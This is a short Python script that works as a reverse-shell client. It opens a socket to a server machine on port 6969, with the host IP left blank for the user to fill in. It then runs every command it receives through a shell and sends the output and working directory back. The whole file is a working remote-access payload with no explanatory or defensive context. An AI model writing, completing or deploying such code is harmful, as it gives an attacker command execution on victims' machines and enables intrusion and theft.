import os
import socket
import subprocess

s = socket.socket()
host = ' ' #IP of server machine
port = 6969
s.connect((host, port))

while True:  # Keeps the shell active
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':  # if input is cd ___
        os.chdir(data[3:].decode("utf-8"))  # decode using utf-8 only the parts after 3 spaces
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '>'))
        print(output_str)
s.close()
